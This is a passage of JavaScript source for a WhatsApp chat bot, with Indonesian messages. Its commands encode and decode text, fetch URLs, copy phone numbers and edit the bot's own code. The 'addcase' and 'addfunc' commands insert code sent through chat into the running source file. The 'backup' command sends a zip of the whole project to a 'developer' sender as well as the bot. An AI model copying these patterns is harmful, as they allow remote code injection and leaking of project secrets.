                        outEncoded = toBase64Buffer(inputBuf);
                    } else {
                        outEncoded = encryptAESBuffer(inputBuf, pass);
                    }
                }
    
                // decide to send inline or as file
                const MAX_INLINE = 1500;
                if (outEncoded.length <= MAX_INLINE) {
                    // send inline in code block
                    const header = (mode === 'base64') ? 'Base64' : 'AES+Base64';
                    const hint = (mode === 'aes') ? `Passphrase used: ${'*'.repeat(6)}` : '';
                    const body = [
                        `*Encrypted (${header})* ${hint}`,
                        '',
                        '```',
                        outEncoded,
                        '```',
                        '',
                        'To decode:',
                        mode === 'base64'
                            ? 'Node: Buffer.from(<base64>, "base64").toString("utf-8")'
                            : 'Use this bot: reply with .decrypt aes <passphrase> or run decrypt routine'
                    ].join('\n');
    
                    await sock.sendMessage(m.chat, { text: body }, { quoted: m });
                } else {
                    // send as file
                    const outName = buffer
                        ? (originalFileName + (mode === 'aes' ? '.aes.b64' : '.b64'))
                        : `encrypted_${Date.now()}.${mode === 'aes' ? 'aes.b64' : 'b64'}`;
                    const outBuffer = Buffer.from(outEncoded, 'utf-8');
    
                    await sock.sendMessage(
                        m.chat,
                        {
                            document: outBuffer,
                            fileName: outName,
                            mimetype: 'application/octet-stream',
                            caption: `Encrypted (${mode.toUpperCase()}). File: ${outName}`
                        },
                        { quoted: m }
                    );
                }
            } catch (e) {
                console.error(e);
                await sock.sendMessage(m.chat, { text: 'Gagal mengenkripsi: ' + (e.message || e) }, { quoted: m });
            }
        }
        break;
        //═══════════════════════════════════//
        case 'dechtml':
        case 'decrypthtml': {
    
            async function getQuotedBuffer(msg) {
                try {
                    const q = msg.quoted ? msg.quoted : null;
                    if (!q) return null;
                    const buff = await q.download?.();
                    return buff || null;
                } catch (e) { return null; }
            }
    
            function getQuotedFileName(msg) {
                try {
                    const q = msg.quoted;
                    if (!q) return null;
                    const fileName =
                        q.filename ||
                        q.fileName ||
                        q.msg?.fileName ||
                        q.msg?.documentMessage?.fileName ||
                        q.message?.documentMessage?.fileName ||
                        null;
                    return fileName;
                } catch (e) { return null; }
            }
    
            // parse optional explicit mode & pass from args
            let explicitMode = null; // 'base64' or 'aes' or null
            let explicitPass = null;
            if (args[0]) {
                if (args[0].toLowerCase() === 'base64') explicitMode = 'base64';
                else if (args[0].toLowerCase() === 'aes') {
                    explicitMode = 'aes';
                    explicitPass = args[1] || null;
                }
            }
    
            // get source
            let buffer = await getQuotedBuffer(m);
            let originalFileName = buffer ? (getQuotedFileName(m) || `file_${Date.now()}`) : null;
            let inline = text || (m.quoted && (m.quoted.text || m.quoted.caption)) || '';
    
            if (!buffer && !inline.trim()) {
                return sock.sendMessage(
                    m.chat,
                    { text: `Reply file .b64/.aes.b64 atau kirim Base64/AES string lalu: ${prefix}decrypt [aes <pass>]` },
                    { quoted: m }
                );
            }
    
            try {
                let encodedStr = '';
                if (buffer) {
                    // treat buffer as UTF-8 text (file .b64)
                    encodedStr = Buffer.from(buffer).toString('utf-8').trim();
                } else {
                    encodedStr = inline.trim();
                }
    
                encodedStr = stripBackticks(encodedStr);
    
                // detect AES or plain base64
                let isAES = false;
                if (explicitMode === 'aes') isAES = true;
                else if (explicitMode === 'base64') isAES = false;
                else {
                    // auto detect: prefix "AES:" OR if decoded base64 contains salt+iv? simpler: check prefix
                    if (encodedStr.startsWith('AES:')) isAES = true;
                    else isAES = false;
                }
    
                if (isAES) {
                    // get pass
                    let pass = explicitPass || args[1] || null;
                    // if user sent 'AES:<b64>' inline and provided pass as second arg: command: .decrypt aes mypass <encoded>
                    // try to extract pass if not provided but args[1] may be encoded string; in that case require pass
                    if (!pass) {
                        return sock.sendMessage(m.chat, { text: 'Mode AES dipilih — perlu passphrase. Contoh: .decrypt aes yourpass (atau reply file .aes.b64 with caption .decrypt aes yourpass)' }, { quoted: m });
                    }
    
                    // remove AES: prefix if present
                    let rawB64 = encodedStr.startsWith('AES:') ? encodedStr.slice(4) : encodedStr;
    
                    // attempt decrypt
                    let decBuf;
                    try {
                        decBuf = decryptAESBase64String(rawB64, pass); // returns Buffer
                    } catch (e) {
                        throw new Error('AES decrypt failed: ' + (e.message || e));
                    }
    
                    // decide send inline or file
                    const decodedText = decBuf.toString('utf-8');
                    const MAX_INLINE = 1500;
                    if (decodedText.length <= MAX_INLINE) {
                        const replynya = [
                            '*Decrypted (AES)*',
                            '',
                            '```html',
                            decodedText,
                            '```'
                        ].join('\n');
                        await sock.sendMessage(m.chat, { text: replynya }, { quoted: m });
                    } else {
                        // send as file (.html)
                        const outName = originalFileName && originalFileName.endsWith('.aes.b64')
                            ? originalFileName.replace(/\.aes\.b64$/i, '') || `decrypted_${Date.now()}.html`
                            : `decrypted_${Date.now()}.html`;
                        await sock.sendMessage(
                            m.chat,
                            {
                                document: decBuf,
                                fileName: outName,
                                mimetype: 'text/html',
                                caption: `Decrypted (AES) -> ${outName}`
                            },
                            { quoted: m }
                        );
                    }
                } else {
                    // base64 mode
                    // encodedStr is base64 of data; decode buffer
                    let decBuf;
                    try {
                        decBuf = fromBase64StringToBuffer(encodedStr);
                    } catch (e) {
                        throw new Error('Invalid Base64 data.');
                    }
    
                    // heuristics: if decoded looks like text (utf-8)
                    const decodedText = decBuf.toString('utf-8');
                    const MAX_INLINE = 1500;
                    if (decodedText.length <= MAX_INLINE) {
                        const replynya = [
                            '*Decrypted (Base64)*',
                            '',
                            '```html',
                            decodedText,
                            '```'
                        ].join('\n');
                        await sock.sendMessage(m.chat, { text: replynya }, { quoted: m });
                    } else {
                        // send as file .html (if original filename present, try to strip .b64)
                        const outName = originalFileName && originalFileName.endsWith('.b64')
                            ? originalFileName.replace(/\.b64$/i, '') || `decrypted_${Date.now()}.html`
                            : `decrypted_${Date.now()}.html`;
                        await sock.sendMessage(
                            m.chat,
                            {
                                document: decBuf,
                                fileName: outName,
                                mimetype: 'text/html',
                                caption: `Decrypted (Base64) -> ${outName}`
                            },
                            { quoted: m }
                        );
                    }
                }
            } catch (e) {
                console.error(e);
                await sock.sendMessage(m.chat, { text: 'Gagal mendekode: ' + (e.message || e) }, { quoted: m });
            }
        }
        break;
        //═══════════════════════════════════//
        case "backup": case 'backupsc': {
            if (!isBot && !isDeveloper) return;
            await reaction(m.chat, "♠️")
            try {
                const backupName = `CancerBackup-${todayDateWIB}.zip`;
                const outputPath = path.join(__dirname, backupName);
        
                const output = fs.createWriteStream(outputPath);
                const archive = archiver("zip", { zlib: { level: 9 } });
        
                archive.pipe(output);
        
                // Memasukkan semua file dalam folder project kecuali folder backup
                archive.glob("**/*", {
                    ignore: ["backups/**", "node_modules/**", `${backupName}`]
                });
        
                await archive.finalize();
        
                await sock.sendMessage(m.chat, {
                    document: fs.readFileSync(outputPath),
                    mimetype: "application/zip",
                    fileName: backupName
                });
        
                // Opsional, pindahkan ke folder backups
                const backupFolder = path.join(__dirname, "backups");
                if (!fs.existsSync(backupFolder)) fs.mkdirSync(backupFolder);
        
                fs.renameSync(outputPath, path.join(backupFolder, backupName));
        
            } catch (err) {
                console.error(err);
                sock.sendMessage(m.chat, { text: "Backup gagal, cek console." });
            }
        }
        break;
        //═══════════════════════════════════//
        case 'inspectfull': case 'inspect': case 'insp': {
            if(!isOwner && !isPremium) return; 
            if (!m.quoted) return reply("Reply pesan yang ingin di-inspect!");
        
            const full = m.quoted; // raw object
            
            const resultnya = "```json\n" +
            JSON.stringify(full, null, 2) +
            "\n```";
            await reaction(m.chat, "♠️")
            let Msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: { "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
                        interactiveMessage: {
                            body: { text: resultnya },
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "📋 Copy Code",
                                            copy_code: resultnya
                                        })
                                    }
                                ], 
                            },
                        },
                    }, 
                }, 
            },{ quoted : m });
            await sleep(1500)
            await sock.relayMessage( Msg.key.remoteJid, Msg.message,{ messageId: Msg.key.id })
        }
        break;
        //═══════════════════════════════════//
        case "addcase": {
            if (!isOwner) return;
            if (!text) {
                return reply(
                    `Contoh:\n` +
                    `${prefix + command} nama_case\n\n` +
                    `Lalu reply ke:\n` +
                    `- kode teks\n` +
                    `- file .js\n` +
                    `- file .json`
                );
            }
            
            const path = require("path");
            const filePath = "./Start/ItssDric.js";
            const backupPath = "./Start/ItssDric_backup.js";
        
            if (!fs.existsSync(filePath)) {
                return reply(`❌ File utama tidak ditemukan:\n${filePath}`);
            }
        
            const originalFile = fs.readFileSync(filePath, "utf8");
            const caseName = text.trim().split(/\s+/)[0].toLowerCase();
        
            // Cek case sudah ada atau belum
            const caseRegex = new RegExp(`case\\s+["'\`]${escapeRegExp(caseName)}["'\`]\\s*:`, "m");
            if (caseRegex.test(originalFile)) {
                return reply(`❌ Case "${caseName}" sudah ada`);
            }
        
            let rawBody = "";
        
            // 1. Ambil dari quoted/file/text
            if (m.quoted) {
                const q = m.quoted;
                const mime = q.mimetype || q.msg?.mimetype || "";
                const fileName = q.fileName || "";
        
                // Ambil dari file .js
                if (
                    mime === "application/javascript" ||
                    mime === "text/javascript" ||
                    mime === "application/x-javascript" ||
                    fileName.endsWith(".js")
                ) {
                    const buffer = await q.download();
                    rawBody = buffer.toString("utf8");
                }
        
                // Ambil dari file .json
                else if (
                    mime === "application/json" ||
                    mime === "text/json" ||
                    fileName.endsWith(".json")
                ) {
                    const buffer = await q.download();
                    const jsonText = buffer.toString("utf8").trim();
        
                    try {
                        const parsed = JSON.parse(jsonText);
        
                        if (typeof parsed === "string") {
                            rawBody = parsed;
                        } else if (parsed && typeof parsed === "object") {
                            rawBody = parsed.body || parsed.code || parsed.case || "";
                        }
        
                        if (!rawBody) {
                            return reply(
                                `❌ File JSON valid, tapi isi case tidak ketemu.\n\n` +
                                `Gunakan format:\n` +
                                `{\n  "body": "reply('halo')"\n}\n` +
                                `atau\n` +
                                `{\n  "code": "reply('halo')"\n}`
                            );
                        }
                    } catch (err) {
                        return reply(`❌ File JSON tidak valid\n\n${err.message}`);
                    }
                }
        
                // Ambil dari teks biasa
                else {
                    rawBody =
                        q.text ||
                        q.caption ||
                        q.body ||
                        q.message?.conversation ||
                        "";
                }
            }
        
            // 2. Kalau tidak reply, ambil isi setelah nama case
            const directBody = text.trim().slice(caseName.length).trim();
            if (!rawBody && directBody) {
                rawBody = directBody;
            }
        
            if (!rawBody) {
                return reply(
                    `❌ Isi case tidak ditemukan!\n\n` +
                    `Cara pakai:\n` +
                    `${prefix + command} ${caseName}\n` +
                    `Lalu reply ke kode / file .js / file .json`
                );
            }
        
            // Bersihkan wrapper jika user kirim full case
            rawBody = cleanCaseWrapper(rawBody);
        
            if (!rawBody.trim()) {
                return reply(`❌ Isi case kosong setelah diproses`);
            }
        
            // Rapikan indent
            const formattedBody = indentCaseBody(rawBody, 12);
        
            const newCaseBlock =
        `\n        case "${caseName}": {\n${formattedBody}\n        }\n        break;\n`;
        
            // Backup dulu
            fs.writeFileSync(backupPath, originalFile, "utf8");
        
            // Sisipkan sebelum default:, kalau tidak ada taruh sebelum penutup switch terakhir
            let updatedFile = "";
        
            const defaultIndex = originalFile.lastIndexOf("default:");
            if (defaultIndex !== -1) {
                updatedFile =
                    originalFile.slice(0, defaultIndex) +
                    newCaseBlock + "\n" +
                    originalFile.slice(defaultIndex);
            } else {
                const insertIndex = originalFile.lastIndexOf("}");
                if (insertIndex === -1) {
                    return reply(`❌ Gagal menemukan lokasi penyisipan case`);
                }
        
                updatedFile =
                    originalFile.slice(0, insertIndex) +
                    newCaseBlock +
                    originalFile.slice(insertIndex);
            }
        
            fs.writeFileSync(filePath, updatedFile, "utf8");
        
            reply(
                `✅ Case "${caseName}" berhasil ditambahkan!\n` +
                `📦 Backup: ${backupPath}\n` +
                `🧹 Format indent dirapikan otomatis`
            );
        
            function escapeRegExp(str) {
                return str.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
            }
        
            function cleanCaseWrapper(code) {
                let result = String(code).replace(/\r/g, "").trim();
        
                // Hapus pembungkus full case bila ada
                result = result.replace(/^\s*case\s+["'\`][^"'\`]+["'\`]\s*:\s*\{/i,
                    ""
                );
        
                result = result.replace(/\}\s*break\s*;?\s*$/i, "");
                result = result.replace(/^\s*\{\s*/, "");
                result = result.trim();
        
                return result;
            }
        
            function indentCaseBody(code, baseIndent = 12) {
                const lines = String(code)
                    .replace(/\t/g, "    ")
                    .replace(/\r/g, "")
                    .split("\n");
        
                // Hapus baris kosong di awal & akhir
                while (lines.length && !lines[0].trim()) lines.shift();
                while (lines.length && !lines[lines.length - 1].trim()) lines.pop();
        
                // Cari indent minimum dari baris yang tidak kosong
                let minIndent = Infinity;
                for (const line of lines) {
                    if (!line.trim()) continue;
                    const leadingSpaces = line.match(/^ */)[0].length;
                    if (leadingSpaces < minIndent) minIndent = leadingSpaces;
                }
        
                if (!isFinite(minIndent)) minIndent = 0;
        
                const pad = " ".repeat(baseIndent);
        
                return lines
                    .map(line => {
                        if (!line.trim()) return "";
                        return pad + line.slice(minIndent);
                    })
                    .join("\n");
            }
        }
        break;
        //═══════════════════════════════════//
        case "getcase": {
            if (!isOwner) return;
            if (!text) return reply(`Contoh: ${prefix + command} nama_case`);
    
            const file = fs.readFileSync("./Start/ItssDric.js", "utf8");
            const regex = new RegExp(`case ['"\`]${text}['"\`]\\s*:[\\s\\S]*?break`, "m");
            const match = file.match(regex);
        
            if (match) {
                await sock.sendMessage(m.chat, {
                    interactiveMessage: {
                        title: `${match[0]}`,
                        footer: global.footer,
                        thumbnail: global.thumb,
                        contextInfo: {
                            mentionedJid: [m.sender], 
                            isForwarded: true, 
                            forwardingScore: 250930,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: global.idSaluran,
                                newsletterName: global.namaSaluran,
                                serverId: 999
                            },
                        },
                        nativeFlowMessage: {
                            buttons: [
                              {
                                name: "cta_copy",
                                buttonParamsJson: JSON.stringify({
                                  display_text: "Copy Code",
                                  copy_code: `${match[0]}`,
                                })
                              }
                            ]
                        }
                    }
                }, { quoted: contactQ });
            } else {
                m.reply(`Case ${text} tidak ditemukan`);
            }
        }
        break;
        //═══════════════════════════════════//
        case "delcase": {
            if (!isOwner) return;
            if (!text) return reply(`Contoh: ${prefix + command} nama_case`);
    
            const filePath = "./Start/ItssDric.js";
            const file = fs.readFileSync(filePath, "utf8");
            const regex = new RegExp(`case ['"\`]${text}['"\`]\\s*:[\\s\\S]*?break\\s*`, "m");
            const match = file.match(regex);
        
            if (!match) return m.reply(`Case ${text} tidak ditemukan`);
        
            // Buat backup sebelum hapus
            fs.writeFileSync("./Start/ItssDric_backup.js", file, "utf8");
        
            // Hapus case yang ditemukan
            const updated = file.replace(regex, "");
            fs.writeFileSync(filePath, updated, "utf8");
        
            m.reply(`✅ Case "${text}" berhasil dihapus!\n📦 Backup tersimpan di: ./Start/ItssDric_backup.js`);
        }
        break;
        //═══════════════════════════════════//
        case "listcase": {
            if (!isOwner) return
        
            if (!fs.existsSync(AUTO_CASE_FILE)) {
                return reply(`❌ File case tidak ditemukan:\n${AUTO_CASE_FILE}`)
            }
        
            const source = fs.readFileSync(AUTO_CASE_FILE, "utf8")
            const cases = extractCaseNames(source)
        
            if (!cases.length) {
                return reply("❌ Tidak ada case yang ditemukan")
            }
        
            const textList =
                `📦 *DAFTAR CASE*\n` +
                `📁 File: ${AUTO_CASE_FILE}\n` +
                `🧩 Total: ${cases.length}\n\n` +
                cases.map((v, i) => `${i + 1}. ${v}`).join("\n")
        
            const chunks = chunkText(textList, 3500)
            for (const part of chunks) {
                await reply(part)
            }
        }
        break
        //═══════════════════════════════════//
        case "getfunc": {
            if (!isOwner) return
            if (!text) return reply(`Contoh: ${prefix + command} namaFunction`)
        
            if (!fs.existsSync(AUTO_FUNC_FILE)) {
                return reply(`❌ File function tidak ditemukan:\n${AUTO_FUNC_FILE}`)
            }
        
            const funcName = text.trim().split(/\s+/)[0]
            const source = fs.readFileSync(AUTO_FUNC_FILE, "utf8")
            const block = getFunctionBlockByName(source, funcName)
        
            if (!block) {
                return reply(`❌ Function "${funcName}" tidak ditemukan`)
            }
        
            const result = `/* FUNCTION: ${funcName} */\n\n${block}`
        
            if (result.length <= 3500) {
                return reply("```js\n" + result + "\n```")
            }
        
            await sock.sendMessage(
                m.chat,
                {
                    document: Buffer.from(result, "utf8"),
                    fileName: `${funcName}.js`,
                    mimetype: "application/javascript",
                    caption: `✅ Function "${funcName}" berhasil diambil`
                },
                { quoted: m }
            )
        }
        break
        //═══════════════════════════════════//
        case "addfunc": {
            if (!isOwner) return
        
            if (!fs.existsSync(AUTO_FUNC_FILE)) {
                return reply(`❌ File function tidak ditemukan:\n${AUTO_FUNC_FILE}`)
            }
        
            const providedName = text ? text.trim().split(/\s+/)[0] : ""
            let rawCode = ""
        
            if (m.quoted) {
                rawCode = await readQuotedCode(m.quoted)
            }
        
            const directCode = text ? text.trim().slice(providedName.length).trim() : ""
            if (!rawCode && directCode) {
                rawCode = directCode
            }
        
            rawCode = stripCodeFence(rawCode)
        
            if (!rawCode) {
                return reply(
                    `Contoh:\n` +
                    `${prefix + command} namaFunction\n\n` +
                    `Lalu reply ke:\n` +
                    `- isi body function\n` +
                    `- full async function\n` +
                    `- file .js\n` +
                    `- file .json`
                )
            }
        
            let finalCode = ""
            let funcName = extractFunctionNameFromCode(rawCode) || providedName
        
            if (!funcName) {
                return reply(
                    `❌ Nama function tidak ditemukan.\n\n` +
                    `Kalau kamu cuma reply isi body function, pakai:\n` +
                    `${prefix + command} namaFunction`
                )
            }
        
            const looksLikeFullFunction =
                /async\s+function\s+[A-Za-z_$][\w$]*\s*\(/.test(rawCode) ||
                /function\s+[A-Za-z_$][\w$]*\s*\(/.test(rawCode) ||
                /(?:const|let|var)\s+[A-Za-z_$][\w$]*\s*=\s*async\b/.test(rawCode) ||
                /(?:const|let|var)\s+[A-Za-z_$][\w$]*\s*=\s*\([^)]*\)\s*=>/.test(rawCode)
        
            if (looksLikeFullFunction) {
                finalCode = normalizeIndent(rawCode, 0)
            } else {
                const body = normalizeIndent(rawCode, 4)
                finalCode =
        `async function ${funcName}() {
        ${body}
        }`
            }
        
            const source = fs.readFileSync(AUTO_FUNC_FILE, "utf8")
            const exists = getFunctionBlockByName(source, funcName)
        
            if (exists) {
                return reply(`❌ Function "${funcName}" sudah ada`)
            }
        
            fs.writeFileSync(AUTO_FUNC_BACKUP, source, "utf8")
        
            const updated = insertFunctionBlock(source, finalCode)
            fs.writeFileSync(AUTO_FUNC_FILE, updated, "utf8")
        
            reply(
                `✅ Function "${funcName}" berhasil ditambahkan\n` +
                `📁 File: ${AUTO_FUNC_FILE}\n` +
                `📦 Backup: ${AUTO_FUNC_BACKUP}`
            )
        }
        break
        //═══════════════════════════════════//
        case "get": {
            if (!isOwner) return reply(msg.owner);
            if (!text) return reply(`Contoh: ${prefix + command} https://example.com`);
            await reaction(m.chat, "♠️")
            const url = text.trim();
            const linkRegex = /^https?:\/\/[^\s]+$/i;
            if (!linkRegex.test(url)) return reply(`URL tidak valid.\nContoh: ${prefix + command} https://example.com`);
          
            await sock.sendMessage(m.chat, { react: { text: "⚡", key: m.key } });
          
            const tmpDir = path.join(__dirname || process.cwd(), "tmp");
            if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir, { recursive: true });
          
            const safeName = (u) => {
              const hash = crypto.createHash("md5").update(u).digest("hex").slice(0, 8);
              const host = new URL(u).hostname.replace(/[:\/\\?&=]/g, "_");
              return `${host}_${hash}`;
            };
            const base = safeName(url);
            const htmlPath = path.join(tmpDir, `${base}.html`);
          
            try {
                const res = await fetch(url);
                const contentType = (res.headers.get("content-type") || "").toLowerCase();
                const contentLength = parseInt(res.headers.get("content-length") || "0", 10);
                if (contentLength > 100 * 1024 * 1024)
                  return reply(`File terlalu besar: ${(contentLength / (1024 * 1024)).toFixed(2)} MB`);
            
                const bodyText = await res.text();
                fs.writeFileSync(htmlPath, bodyText, "utf8");
            
                await sock.sendMessage(m.chat, {
                  document: fs.readFileSync(htmlPath),
                  fileName: path.basename(htmlPath),
                  mimetype: "text/html"
                }, { quoted: m });
            
                fs.unlinkSync(htmlPath);
            } catch (err) {
              console.error(err);
              m.reply(`❌ Gagal mengambil/mengolah URL\nDetail: ${err.message}`);
            }
        }
        break;
        //═══════════════════════════════════//
        case "getzip": {
            if (!isOwner) return reply(msg.owner);
            if (!text) return reply(`Contoh: ${prefix + command} https://example.com`);
            await reaction(m.chat, "♠️")
            const url = text.trim();
            const linkRegex = /^https?:\/\/[^\s]+$/i;
            if (!linkRegex.test(url)) return reply(`URL tidak valid.\nContoh: ${prefix + command} https://example.com`);
          
            await sock.sendMessage(m.chat, { react: { text: "⚡", key: m.key } });
          
            const tmpDir = path.join(__dirname || process.cwd(), "tmp");
            if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir, { recursive: true });
          
            const safeName = (u) => {
                const hash = crypto.createHash("md5").update(u).digest("hex").slice(0, 8);
                const host = new URL(u).hostname.replace(/[:\/\\?&=]/g, "_");
                return `${host}_${hash}`;
            };
            const base = safeName(url);
            const htmlPath = path.join(tmpDir, `${base}.html`);
            const zipPath = path.join(tmpDir, `${base}.zip`);
          
            try {
                const res = await fetch(url);
                const contentType = (res.headers.get("content-type") || "").toLowerCase();
                const contentLength = parseInt(res.headers.get("content-length") || "0", 10);
                if (contentLength > 100 * 1024 * 1024)
                  return reply(`File terlalu besar: ${(contentLength / (1024 * 1024)).toFixed(2)} MB`);
            
                const bodyText = await res.text();
                fs.writeFileSync(htmlPath, bodyText, "utf8");
            
                // --- Buat ZIP ---
                let zipSuccess = false;
                try {
                    await new Promise((resolve, reject) => {
                      const output = fs.createWriteStream(zipPath);
                      const archive = archiver("zip", { zlib: { level: 9 } });
                      output.on("close", resolve);
                      output.on("error", reject);
                      archive.on("error", reject);
                      archive.pipe(output);
                      archive.append(fs.createReadStream(htmlPath), { name: path.basename(htmlPath) });
                      archive.finalize();
                    });
                    zipSuccess = true;
                } catch (e1) {
                    try {
                        const AdmZip = require("adm-zip");
                        const zip = new AdmZip();
                        zip.addLocalFile(htmlPath);
                        zip.writeZip(zipPath);
                        zipSuccess = true;
                    } catch (e2) {
                      console.warn("ZIP gagal dibuat:", e1, e2);
                    }
                }
            
                if (!zipSuccess) {
                  await sock.sendMessage(m.chat, {
                    document: fs.readFileSync(htmlPath),
                    fileName: path.basename(htmlPath),
                    mimetype: "text/html"
                  }, { quoted: m });
                  m.reply("⚠️ Tidak dapat membuat ZIP. Mengirim file HTML saja.");
                } else {
                  await sock.sendMessage(m.chat, {
                    document: fs.readFileSync(zipPath),
                    fileName: path.basename(zipPath),
                    mimetype: "application/zip"
                  }, { quoted: m });
                }
            
                // Hapus file setelah kirim
                try { fs.unlinkSync(htmlPath); } catch {}
                try { fs.unlinkSync(zipPath); } catch {}
            } catch (err) {
              console.error(err);
              m.reply(`❌ Gagal mengambil/mengompres URL\nDetail: ${err.message}`);
            }
        }
        break;
        //═══════════════════════════════════//
        // ===========================
        // 📋 COPY TARGET (reply / tag / nomor langsung)
        // ===========================
        case "copyme":
        case "copy": {
            try {
                const cmd = command.toLowerCase();
                let targetJid;
            
                if (cmd === "copyme") {
                  targetJid = m.sender || (m.key && (m.key.participant || m.key.remoteJid));
                }
          
                else {
                    if (m.mentionedJid && m.mentionedJid.length) {
                      targetJid = m.mentionedJid[0];
                    } else if (m.quoted && (m.quoted.sender || (m.quoted.key && m.quoted.key.participant))) {
                      targetJid = m.quoted.sender || m.quoted.key.participant;
                    } else if (text) {
                      const digits = text.replace(/[^0-9]/g, '');
                      if (digits) targetJid = digits + '@s.whatsapp.net';
                    }
              
                    if (!targetJid)
                      return sock.sendMessage(m.chat, { text: '⚠️ Reply, tag, atau ketik nomor target dulu!' }, { quoted: m });
                }
            
                // 🚫 Jika grup
                if (targetJid.endsWith('@g.us'))
                  return sock.sendMessage(m.chat, { text: '❌ Tidak bisa menyalin nomor grup.' }, { quoted: m });
            
                // 🔢 Ambil nomor asli
                const number = targetJid.replace(/[^0-9]/g, '');
                const isSelf = (cmd === 'copyme');
                const title = isSelf ? "✅ *BERHASIL COPY NOMOR KAMU*" : "✅ *BERHASIL MENDAP NOMOR TARGET*";
                const textMsg = isSelf
                  ? `\n🪀 Nomor Kamu\n╰┈➤ *${number}*`
                  : `\n🎯 Nomor Target\n╰┈➤ *${number}*`;
            
                const NewMsg = generateWAMessageFromContent(m.chat, {
                    viewOnceMessage: {
                        message: {
                            "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
                            interactiveMessage: {
                                body: { text: `${textMsg}` },
                                footer: { text: `\nᴛᴇᴋᴀɴ ᴛᴏᴍʙᴏʟ ᴅɪʙᴀᴡᴀʜ ɪɴɪ ᴜɴᴛᴜᴋ ᴍᴇɴʏᴀʟɪɴ ɴᴏᴍᴏʀ.` },
                                mentionedJid: [number],
                                nativeFlowMessage: {
                                    buttons: [
                                        {
                                          name: "cta_copy",
                                          buttonParamsJson: JSON.stringify({
                                            display_text: "📋 SALIN NOMOR",
                                            id: "copy_number",
                                            copy_code: number
                                          })
                                        },
                                        {
                                          name: "cta_url",
                                          buttonParamsJson: JSON.stringify({
                                            display_text: "💬 CHAT PRIVATE",
                                            url: `https://wa.me/${number}`
                                          })
                                        }
                                    ]
                                }
                            }
                        }
                    }
                }, { quoted: m });
        
                await sock.relayMessage(NewMsg.key.remoteJid, NewMsg.message, { messageId: NewMsg.key.id });
                
                await sock.sendMessage(m.chat, {
                  react: { text: '♠️', key: m.key }
                });
          
            } catch (err) {
              console.error(err);
              await sock.sendMessage(m.chat, { text: "❌ Terjadi error saat menjalankan perintah copy." }, { quoted: m });
            }
        }
        break;
        //════════════════════════════════════//
        case "mute": case "diam":
        case "mutebot": {
            if (!m.isGroup) return;
            if (!isOwner) return;
        
            const data = getMuted();
            const jid = m.chat;
        
            if (data.includes(jid)) return reply("Bot sudah dalam mode mute di grup ini.");
        
            data.push(jid);
            saveMuted(data);
            await reaction(m.chat, "♠️")
            reply(`Siap, Bot akan diam di grup ini.\nHanya Owner yang bisa menggunakan bot.`);
        }
        break;
        //═══════════════════════════════════//
        case "unmute":
        case "unmutebot": {
            if (!m.isGroup) return;
            if (!isOwner) return;
        
            const data = getMuted();
            const jid = m.chat;
        
            if (!data.includes(jid)) return reply("Bot belum dalam mode mute di grup ini.");
        
            const index = data.indexOf(jid);
            data.splice(index, 1);
            saveMuted(data);
        
            reply("Bot sudah aktif kembali di grup ini.");
        }
        break;
        //═══════════════════════════════════//
        case "tostring": case "toascii": case "toasci": {
            if (!isOwner) return;
            if (!q) return reply("Masukkan teks yang ingin diubah ke kode ASCII!")
            let encoded = q
                .split("")
                .map(char => char.charCodeAt(0))
                .join(", ")
            let teks = `\`[ # ]\` Ini Hasil Encode Ascii:*\n*${encoded}* \n\n`
          
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
                        interactiveMessage: {
                            body: { text: teks },
                            footer: { text: `— ${global.footer}` },
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                    name: "cta_copy",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "📋 Copy String",
                                        copy_code: encoded
                                    })
                                }
                                ]
                            }
                        }
                    }
                }
            }, { quoted: m })
          
        await sock.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })
        }
        break
        //═══════════════════════════════//
        case "decodeascii": case "decodeasci": {
            if (!isOwner) return;
            if (!q) return reply("Masukkan kode ASCII (pisahkan dengan koma) untuk diubah ke teks!")
            try {
                let decoded = q
                    .split(",")
                    .map(code => String.fromCharCode(parseInt(code.trim())))
                    .join("")
                    reply(`Hasil Decode ASCII:\n\n${decoded}`)
            } catch (e) {
              reply("Format kode ASCII salah! Pisahkan dengan koma (contoh: 72, 101, 108, 108, 111).\n\n_Catatan: Pastikan hanya menggunakan angka ASCII valid.")
            }
            await sleep(2000)
        }
        break
        //═══════════════════════════════════//
        case 'ascii-art': {
            // .ascii [width optional]
            // contoh: .ascii 80  → lebar 80
            // default width = 60
    
            let width = 50;
            if (args[0] && !isNaN(args[0])) {
                width = Math.max(20, Math.min(parseInt(args[0]), 200)); // batas aman
            }
    
            // ambil media: kalau reply gambar, pakai quoted
            // kalau kirim gambar dengan caption .ascii, pakai m sendiri
            let q = m.quoted ? m.quoted : m;
            let mime = (q.msg || q).mimetype || '';
    
            if (!/image|video|sticker/.test(mime)) {
                return sock.sendMessage(
                    m.chat,
                    { 
                        text: `Reply atau kirim *gambar* dengan caption *${prefix + command} [width]*\n\nContoh:\n${prefix + command} 80` 
                    },
                    { quoted: m }
                );
            }
    
            // download media
            let buffer;
            try {
                buffer = await q.download();
            } catch (e) {
                console.error(e);
                return sock.sendMessage(
                    m.chat,
                    { text: 'Gagal mendownload media.' },
                    { quoted: m }
                );
            }
    
            // convert ke ascii
            let ascii;
            try {
                ascii = await imageToAscii(buffer, { width });
            } catch (e) {
                console.error(e);
                return sock.sendMessage(
                    m.chat,
                    { text: 'Gagal mengubah gambar menjadi ASCII.' },
                    { quoted: m }
                );
            }
    
            // kirim dalam blok kode biar gampang disalin
            // WhatsApp bakal kirim sebagai monospace, user tinggal tahan & salin
            await sock.sendMessage(
                m.chat,
                { text: '```' + ascii + '```' },
                { quoted: m }
            );
        }
        break;
        //═══════════════════════════════════//
        //====== Group Menu ======//
        //════════════════════════════════════//
        case "antilink":
        case "antilink2": {
            if (!isGroup) return;
            if (!isAdmins) return;
            if (!isBotAdmins) return;
        
            let isKick = command === "antilink2";
